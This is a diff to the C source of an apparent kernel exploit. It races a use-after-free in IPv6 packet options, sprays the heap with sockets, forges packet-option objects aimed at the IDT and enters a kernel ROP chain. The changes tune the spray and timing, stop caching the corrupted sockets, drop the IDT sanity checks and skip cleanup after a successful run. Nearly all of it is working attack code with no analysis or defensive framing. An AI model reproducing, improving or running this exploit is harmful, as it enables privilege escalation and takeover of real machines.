@@ -20,7 +20,7 @@
 #define TCLASS_MASTER 0x13370000
 #define TCLASS_SPRAY 0x41
 #define TCLASS_TAINT 0x42
-#define SPRAY_SIZE 32
+#define SPRAY_SIZE 64 // Needs trigger_uaf tweaking, NANOSLEEP_50US for 32, NANOSLEEP_75US for 64
 #define SPRAY_TOTAL 320
 #define NEW_SOCKET() socket(AF_INET6, SOCK_DGRAM, 0)
 
@@ -29,7 +29,7 @@
 #define NANOSLEEP_50US  "\0\0\0\0\0\0\0\0\x50\xc3\0\0\0\0\0\0"
 #define NANOSLEEP_10US  "\0\0\0\0\0\0\0\0\x10\x27\0\0\0\0\0\0"
 
-#define MAX_ATTEMPTS 20
+#define MAX_ATTEMPTS 5
 #define HEAP_GROOM_COUNT 100
 #define MAX_TRIES 500
 
@@ -48,7 +48,7 @@
 #define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))
 
 // Reusable socket cache
-#define SOCKET_CACHE_SIZE 64
+#define SOCKET_CACHE_SIZE 128
 
 static int socket_cache[SOCKET_CACHE_SIZE];
 static int socket_cache_count = 0;
@@ -57,10 +57,8 @@ static int socket_cache_initialized = 0;
 // Start socket cache with -1
 void init_socket_cache(void)
 {
-    for (int i = 0; i < SOCKET_CACHE_SIZE; ++i) {
-        socket_cache[i] = -1;
-    }
-
+    if (socket_cache_initialized) return;
+    for (int i = 0; i < SOCKET_CACHE_SIZE; ++i) socket_cache[i] = -1;
     socket_cache_count = 0;
     socket_cache_initialized = 1;
 }
@@ -105,7 +103,7 @@ void cache_socket(int sock) {
     if (socket_cache_count < SOCKET_CACHE_SIZE) {
         socket_cache[socket_cache_count++] = sock;
     } else {
-        close(sock);
+        safe_close_socket(sock);
     }
 }
 
@@ -131,6 +129,12 @@ int get_pktinfo(int s, char* buf) {
     return getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l) ? (*(volatile int*)0) : l;
 }
 
+// Dirty socket (shares in6p_outputopts with master via UAF): never cache,
+// never close, never reuse. Drop the FD; kernel reclaims it on exit.
+static inline void refrain_from_caching(int sock) {
+    (void)sock;
+}
+
 typedef struct {
     int master_sock;
     int kevent_sock;
@@ -141,23 +145,31 @@ typedef struct {
 void comprehensive_cleanup(exploit_state_t* state) {
     if (!state) return;
 
-    if (state->master_sock >= 0) { close(state->master_sock); state->master_sock = -1; }
-    if (state->kevent_sock >= 0) { close(state->kevent_sock); state->kevent_sock = -1; }
-
     if (state->spray_sock) {
         for (int i = 0; i < state->spray_count; i++) {
             if (state->spray_sock[i] >= 0) {
-                close(state->spray_sock[i]);
+                safe_close_socket(state->spray_sock[i]);
                 state->spray_sock[i] = -1;
             }
         }
+    }
+
+    if (state->kevent_sock >= 0) {
+        safe_close_socket(state->kevent_sock);
+        state->kevent_sock = -1;
+    }
+
+    if (state->master_sock >= 0) {
+        safe_close_socket(state->master_sock);
+        state->master_sock = -1;
     }
 
     if (socket_cache_initialized) {
         while (socket_cache_count > 0) {
             int s = socket_cache[--socket_cache_count];
             socket_cache[socket_cache_count] = -1;
-            if (s >= 0) close(s);
+            if (s >= 0)
+                safe_close_socket(s);
         }
     }
 
@@ -180,6 +192,7 @@ void pin_to_cpu(int cpu) {
     CPU_SET(cpu, &set);
     cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(set), &set);
 }
+
 
 void* use_thread(void* arg) {
     struct opaque* o = (struct opaque*)arg;
@@ -224,29 +237,32 @@ void trigger_uaf(struct opaque* o) {
     pthread_t th1, th2;
     pthread_create(&th1, NULL, use_thread, o);
     pthread_create(&th2, NULL, free_thread, o);
-
+		
     nanosleep(NANOSLEEP_75US, NULL); // Critical timing window for race condition
 
-    int attempts = 0;
     const int MAX_SPRAY = SPRAY_SIZE;
+    int attempts = 0;
 
-    while (attempts++ < 1000) {
-        for (int i = 0; i < MAX_SPRAY; i++) {
-            if (set_tclass(o->spray_sock[i], TCLASS_SPRAY))
-                reset_ipv6_opts(o->spray_sock[i]);
-        }
+	while (attempts++ < 1000) {
+		for (int i = 0; i < MAX_SPRAY; i++) {
+			int val = TCLASS_SPRAY;
+			if (setsockopt(o->spray_sock[i], IPPROTO_IPV6,
+						   IPV6_TCLASS, &val, sizeof(val))) {
+				reset_ipv6_opts(o->spray_sock[i]);
+			}
+		}
 
-        if (get_tclass(o->master_sock) == TCLASS_SPRAY)
-            break;
+		if (get_tclass(o->master_sock) == TCLASS_SPRAY)
+			break;
 
-        if (!o->triggered) {
-            for (int i = 0; i < MAX_SPRAY; i++) {
-                free_pktopts(o->spray_sock[i]);
-            }
-        }
+		if (o->triggered)
+			break;
 
-        nanosleep(NANOSLEEP_100US, NULL);
-    }
+		for (int i = 0; i < MAX_SPRAY; i++) {
+			free_pktopts(o->spray_sock[i]);
+		}
+		nanosleep(NANOSLEEP_100US, NULL);
+	}
 
     o->triggered = 1;
 
@@ -329,14 +345,6 @@ void sidt(unsigned long long* addr, unsigned short* size) {
     *addr = *(unsigned long long*)(buf + 2);
 }
 
-int verify_idt(void) {
-    unsigned long long current_base;
-    unsigned short current_size;
-    sidt(&current_base, &current_size);
-    return (current_size >= 0xFF && current_base != 0);
-}
-
-
 void targeted_heap_defragmentation(void) {
     char pktopts_buf[PKTOPTS_OBJ_SIZE] = {0};
     char pressure_buf[PKTOPTS_OBJ_SIZE] = {0};
@@ -353,19 +361,23 @@ void targeted_heap_defragmentation(void) {
             }
         }
 
+ 
         for (int i = 0; i < DEFRAG_LARGE_SOCKETS; i++) {
             defrag_large[i] = fast_new_socket();
             if (defrag_large[i] >= 0) {
-                setsockopt(defrag_large[i], IPPROTO_IPV6,
-                           IPV6_2292PKTOPTIONS, pressure_buf, PKTOPTS_OBJ_SIZE);
+                set_pktopts(defrag_large[i], pressure_buf, PKTOPTS_OBJ_SIZE);
             }
         }
 
         nanosleep(NANOSLEEP_10US, NULL);
 
+
         for (int i = DEFRAG_LARGE_SOCKETS - 1; i >= 0; i--) {
             if (defrag_large[i] >= 0) {
-                cache_socket(defrag_large[i]);
+                if (free_pktopts(defrag_large[i]))
+                    safe_close_socket(defrag_large[i]);
+                else
+                    cache_socket(defrag_large[i]);
                 defrag_large[i] = -1;
             }
         }
@@ -374,7 +386,10 @@ void targeted_heap_defragmentation(void) {
 
         for (int i = 0; i < DEFRAG_SMALL_SOCKETS; i++) {
             if (defrag_small[i] >= 0) {
-                cache_socket(defrag_small[i]);
+                if (free_pktopts(defrag_small[i]))
+                    safe_close_socket(defrag_small[i]);
+                else
+                    cache_socket(defrag_small[i]);
                 defrag_small[i] = -1;
             }
         }
@@ -433,9 +448,10 @@ int main() {
             nanosleep(NANOSLEEP_10US, NULL);
     }
 	
-	// Close initial 16 sockets for increased socket availability
-	for (int i = 0; i < 16; i++)
-    if (init_socks[i] >= 0) safe_close_socket(init_socks[i]);
+    // Close initial 16 sockets for increased socket availability
+    for (int i = 0; i < 16; i++)
+        if (init_socks[i] >= 0)
+            safe_close_socket(init_socks[i]);
 
     // Phase 2 - SPRAY
     int spray_sock[SPRAY_TOTAL];
@@ -484,17 +500,17 @@ int main() {
             continue;
 
         int overlap_sock = spray_sock[overlap_idx];
-        cache_socket(overlap_sock);
+        refrain_from_caching(overlap_sock);
         spray_sock[overlap_idx] = NEW_SOCKET();
         if (spray_sock[overlap_idx] < 0)
             *(volatile int*)0;
 
         overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
         if (overlap_idx < 0)
-            continue;
+            break;
 
         overlap_sock = spray_sock[overlap_idx];
-        cache_socket(overlap_sock);
+        refrain_from_caching(overlap_sock);
         spray_sock[overlap_idx] = NEW_SOCKET();
         if (spray_sock[overlap_idx] < 0)
             *(volatile int*)0;
@@ -515,11 +531,7 @@ int main() {
 
         set_pktinfo(master_sock, buf);
 
-        if (!verify_idt()) continue;
-
         enter_krop();
-
-        if (!verify_idt()) continue;
 
         exploit_success = 1;
         nanosleep(NANOSLEEP_50US, NULL);
@@ -554,7 +566,8 @@ int main() {
 
     }
 
-    comprehensive_cleanup(&cleanup_state);
+    if (!exploit_success)
+        comprehensive_cleanup(&cleanup_state);  // Only clean up if the exploit failed
 
     return exploit_success ? 0 : 1;
 }
